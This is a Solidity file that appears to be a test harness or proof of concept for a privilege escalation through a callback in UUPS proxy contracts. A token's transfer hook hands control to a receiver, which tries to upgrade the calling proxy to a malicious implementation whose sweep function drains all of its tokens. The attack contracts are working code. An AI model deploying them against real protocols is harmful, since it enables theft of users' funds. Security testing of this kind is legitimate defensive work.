// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { ERC20 } from "@openzeppelin/contracts-v4/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts-v4/token/ERC20/IERC20.sol";

interface IUUPS {
    function upgradeTo(address newImplementation) external;
}

interface IERC1363Receiver {
    function onTransferReceived(address operator, address from, uint256 value, bytes calldata data) external returns (bytes4);
}

// A token with a post-transfer receiver hook (ERC-1363 shape). Any token, bridge or protocol that yields control
// to a third party during a call plays the same role.
contract HookToken is ERC20 {
    constructor() ERC20("Hook", "HOOK") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }

    function transferAndCall(address to, uint256 value, bytes calldata data) external returns (bool) {
        _transfer(msg.sender, to, value);
        IERC1363Receiver(to).onTransferReceived(msg.sender, msg.sender, value, data);
        return true;
    }
}

// Implementation the attacker installs: UUPS-compatible, with a sweep function.
contract EvilImpl {
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function sweep(IERC20 token, address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }
}

// Third-party receiver: during the admin frame it attempts an admin-only action on the spoke that called it.
contract HookReceiver is IERC1363Receiver {
    address public immutable evil;
    bool public upgradeSucceeded;

    constructor(address _evil) {
        evil = _evil;
    }

    function onTransferReceived(address, address from, uint256, bytes calldata) external returns (bytes4) {
        try IUUPS(from).upgradeTo(evil) {
            upgradeSucceeded = true;
        } catch {}
        return IERC1363Receiver.onTransferReceived.selector;
    }
}
